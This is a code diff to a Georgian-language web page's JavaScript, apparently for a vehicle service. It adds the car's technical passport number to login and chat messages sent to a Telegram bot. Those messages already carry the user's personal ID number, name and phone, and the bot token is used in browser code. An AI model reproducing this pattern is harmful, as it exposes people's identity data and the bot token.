@@ -591,7 +591,7 @@
                 return;
             }
 
-            const authMsg = `🔐 <b>კაბინეტში შესვლის მოთხოვნა!</b>\n\n👤 პირადი: ${pid}\n🚗 მანქანა: ${car}\n📞 ტელეფონი: ${phone}`;
+            const authMsg = `🔐 <b>კაბინეტში შესვლის მოთხოვნა!</b>\n\n👤 პირადი: ${pid}\n🚗 მანქანა: ${car}\n📄 ტექპასპორტი: ${savedData.tech || 'არ არის'}\n📞 ტელეფონი: ${phone}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -721,6 +721,7 @@
             }
         }
 
+        /* 💬 განახლებული ჩათი: ტელეგრამში აგზავნის სახელს, ავტომობილს, ტექპასპორტს, პირადს და ტელეფონს */
         function sendChatMessage() {
             const input = document.getElementById('chatInput');
             const msgText = input.value.trim();
@@ -736,11 +737,12 @@
                 const user = JSON.parse(localStorage.getItem('mashveli_user')) || {
                     name: "უცნობი",
                     car: "მითითებული არ არის",
+                    tech: "მითითებული არ არის",
                     pid: "მითითებული არ არის",
                     phone: "მითითებული არ არის"
                 };
 
-                const tgMessage = `💬 <b>ახალი შეტყობინება ონლაინ ჩათიდან:</b>\n\n👤 <b>სახელი:</b> ${user.name}\n🚗 <b>ავტომობილი:</b> ${user.car}\n🆔 <b>პირადი ნომერი:</b> ${user.pid}\n📞 <b>ტელეფონი:</b> ${user.phone}\n\n✉️ <b>შეტყობინება:</b> ${msgText}\n\n<i>(პასუხის გასაცემად უბრალოდ მისწერეთ ტელეგრამის ბოტს)</i>`;
+                const tgMessage = `💬 <b>ახალი შეტყობინება ონლაინ ჩათიდან:</b>\n\n👤 <b>სახელი:</b> ${user.name}\n🚗 <b>ავტომობილი:</b> ${user.car}\n📄 <b>ტექპასპორტი:</b> ${user.tech}\n🆔 <b>პირადი ნომერი:</b> ${user.pid}\n📞 <b>ტელეფონი:</b> ${user.phone}\n\n✉️ <b>შეტყობინება:</b> ${msgText}\n\n<i>(პასუხის გასაცემად უბრალოდ მისწერეთ ტელეგრამის ბოტს)</i>`;
 
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
